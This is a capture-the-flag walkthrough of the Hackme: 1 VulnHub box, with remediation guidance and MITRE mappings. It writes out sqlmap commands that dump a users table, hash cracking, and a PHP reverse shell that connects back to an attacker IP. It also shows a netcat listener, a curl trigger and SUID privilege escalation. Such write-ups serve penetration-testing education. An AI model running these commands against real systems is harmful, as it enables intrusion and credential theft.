# Hackme: 1 — Register, Dump, Upload, Root

Hackme: 1 is a clean, well-constructed beginner box that chains four techniques seamlessly: register an account on the target web app, capture the authenticated request with Burp, feed it to sqlmap to dump the database and extract admin creds, then use those creds to upload a PHP shell via the admin panel. Once on the box, a SUID binary named `touchmenot` sitting in `/home/legacy` is basically screaming at you to GTFOBin your way to root. No cap, this box teaches the full web exploitation loop in under an hour. legit.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Hackme: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/hackme-1,330/ |
| **Techniques** | Nmap recon, web account registration, Burp Suite request capture, sqlmap authenticated SQLi, admin panel file upload, PHP reverse shell, Dirb directory brute-force, SUID binary privesc |
| **CVEs** | CWE-89 (SQL Injection in authenticated web app), CWE-434 (Unrestricted File Upload), CWE-732 (Incorrect SUID permissions) |
| **APT Groups** | APT33 (Elfin): uses authenticated SQL injection against web portals for credential harvesting in energy sector targets; FIN7: consistently exploits file upload vulnerabilities in point-of-sale and hospitality web applications |

---

## Attack Summary

```
netdiscover + nmap → HTTP (80)
  |
  +--> Register account on web app → capture auth request in Burp
          |
          +--> sqlmap -r request.txt → dump db → admin:admin_password
                  |
                  +--> Login as admin → file upload panel
                          |
                          +--> Upload PHP reverse shell → nc listener
                                  |
                                  +--> dirb → find /uploads/shell.php
                                          |
                                          +--> curl trigger → shell (www-data)
                                                  |
                                                  +--> find SUID: /home/legacy/touchmenot
                                                          |
                                                          +--> ./touchmenot → root
```

---

## Methodology

1. Host discovery and Nmap scan
2. Web application enumeration: discover registration and login
3. Register account; capture authenticated POST request with Burp Suite
4. SQL injection with sqlmap using captured request to dump database
5. Extract admin credentials from database dump
6. Login as admin; locate file upload functionality
7. Upload PHP reverse shell; catch with netcat listener
8. Directory brute-force with Dirb to find upload path
9. Trigger shell; escalate via SUID `touchmenot` binary

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.108

nmap -sV -sC -A 192.168.1.108
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Only HTTP. The entire attack lives on port 80.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Application Enumeration

Browse to `http://192.168.1.108/`. You will find a custom web application with registration and login functionality.

```bash
# Enumerate directories
dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt
```

Register an account through the web interface: navigate to the registration form, create a user, and log in. Explore the authenticated functionality.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Capture Request and SQL Injection with sqlmap

With Burp Suite (or OWASP ZAP) configured as a proxy, intercept the authenticated POST request for a search or data-display feature:

```bash
# Configure proxy: 127.0.0.1:8080
# Intercept the authenticated request in Burp > save as /tmp/request.txt
```

The request file looks like:

```
POST /search.php HTTP/1.1
Host: 192.168.1.108
Cookie: PHPSESSID=[session]
...
search=test
```

Run sqlmap against the captured request:

```bash
sqlmap -r /tmp/request.txt --dbs
sqlmap -r /tmp/request.txt -D webapphacking --tables
sqlmap -r /tmp/request.txt -D webapphacking -T users --dump
```

Output reveals the `users` table with usernames and passwords:

```
+-------+-----------+----------------------------------+
| id    | user      | pasword                          |
+-------+-----------+----------------------------------+
| 1     | superadmin | [MD5 hash]                      |
+-------+-----------+----------------------------------+
```

Crack the MD5 hash:

```bash
echo "[hash]" > /tmp/admin_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/admin_hash.txt
# or
hashcat -m 0 /tmp/admin_hash.txt /usr/share/wordlists/rockyou.txt
```

Result: `superadmin:[password]`

**Real-world note:** Authenticated SQL injection is extremely common in custom-built web apps. Developers often properly authenticate the user but then pass user input into raw SQL queries without parameterization. This is OWASP A03:2021 Injection, consistently the top web vulnerability for over a decade.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Credentials in Files

---

## Step 4 — Admin File Upload and Reverse Shell

Log in as `superadmin` with the cracked password. Explore the admin panel for file upload functionality.

Prepare a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit: set $ip = '[attacker_ip]', $port = 4444
```

Start a netcat listener:

```bash
nc -lvnp 4444
```

Upload `shell.php` via the admin panel. The upload may succeed but not immediately reveal the path.

**MITRE ATT&CK:** T1505.003 — Server Software Component: Web Shell

---

## Step 5 — Find Upload Path and Trigger Shell

Brute-force directories to find where uploaded files land:

```bash
dirb http://192.168.1.108/ /usr/share/wordlists/dirb/common.txt
# Look for: /uploads/, /files/, /images/, /media/
```

Once the upload directory is found:

```bash
curl http://192.168.1.108/uploads/shell.php
```

The netcat listener catches the reverse shell as `www-data`:

```
connect to [attacker_ip] from 192.168.1.108
www-data@hackme:/$
```

Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — SUID Binary Privilege Escalation

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Notable finding: `/home/legacy/touchmenot` has the SUID bit set and is owned by root.

```bash
ls -la /home/legacy/
# -rwsr-xr-x 1 root root ... touchmenot

/home/legacy/touchmenot
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

gg. Root achieved via a deliberately misnamed SUID binary.

**Real-world note:** Custom SUID binaries in home directories are a textbook misconfiguration. Any binary with SUID set and owned by root can be used for privilege escalation. In real environments, developers sometimes set SUID on scripts or utilities for convenience, inadvertently creating instant root escalation paths.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Method |
|---|---|---|---|
| MD5 hash | [hash from users table] | webapphacking.users | sqlmap dump |
| Credentials | superadmin:[password] | Cracked from hash | John/Hashcat |
| www-data shell | web process | /uploads/shell.php | File upload |
| Root shell | uid=0 | SUID binary | /home/legacy/touchmenot |
| Root flag | {flag} | /root/flag.txt | cat |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Authenticated SQLi — raw SQL queries without parameterization | OWASP A03:2021; affects virtually every custom-built PHP app | Use prepared statements; ORM; parameterized queries everywhere |
| 2 | Admin credentials stored as crackable MD5 hashes | MD5 is broken for password storage; deprecated since ~2008 | Use bcrypt, Argon2, or PBKDF2 for all password storage |
| 3 | Unrestricted PHP file upload (CWE-434) | One of the most commonly exploited web vulnerabilities since 2005 | Validate file type (MIME + extension + magic bytes); store outside web root |
| 4 | SUID binary in home directory | Custom SUID binaries are a consistent privesc finding in Linux pentests | Audit SUID with `find / -perm -u=s`; remove SUID from non-essential binaries |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Setuid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Parameterize all SQL queries**: use PDO with prepared statements; never interpolate user input into SQL
2. **Replace MD5 with a proper KDF**: bcrypt (cost 12+), Argon2id, or PBKDF2 for password storage
3. **Validate file uploads server-side**: check MIME type, extension, and magic bytes; store outside web root; never execute uploaded content
4. **Remove SUID from non-essential binaries**: audit with `find / -perm -u=s -type f 2>/dev/null`; document justified SUID binaries
5. **Implement web application firewall**: detect and block sqlmap signatures and common SQLi patterns

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (prepared statements; upload validation)
- **D3-FIA** — File Integrity Analysis (monitor upload directories for PHP files)
- **D3-OAM** — Operating System Administrative Management (SUID audit)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all custom web applications; assess SQL injection exposure |
| Protect | Data Security | Prepared statements; bcrypt password storage; upload validation |
| Protect | Protective Technology | WAF with SQLi detection; file integrity monitoring on upload paths |
| Detect | Anomalies | Alert on sqlmap signatures; PHP files appearing in upload directories |
| Respond | Response Planning | Remove uploaded webshells; patch SQL injection; rotate compromised credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| SI-10 | Information Input Validation | Validate all user input; parameterize SQL queries |
| IA-5(1) | Password-Based Authentication | Bcrypt/Argon2 for password storage; no MD5 |
| CM-6 | Configuration Settings | No SUID on non-essential binaries |
| CM-7 | Least Functionality | Restrict file types accepted by upload forms |
| AC-6 | Least Privilege | Minimum required permissions for web service accounts |

### CISA KEV

SQL injection (CWE-89) and unrestricted file upload (CWE-434) are foundational vulnerability classes tracked across multiple CISA Alerts. Both appear in the OWASP Top 10 and are prioritized in CISA's Known Exploited Vulnerabilities catalog remediation guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Identity and Access Management (IAM) | Manage Credentials | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 |

---

## Final Thoughts

Hackme: 1 teaches the foundational web exploitation loop that every pentester needs to have down cold: register, capture, inject, upload, shell, escalate. Four different technique classes, one cohesive attack chain.

The SUID binary named `touchmenot` is a playful clue that this box rewards exploration. Real-world engagements have stranger-named custom binaries with worse misconfigurations. The lesson is the same: always enumerate SUID, always check GTFOBins.

Solid beginner box with real methodology depth. Highly recommended for anyone learning the PHP web exploitation stack.

Thanks guys!! (❍ᴥ❍ʋ)
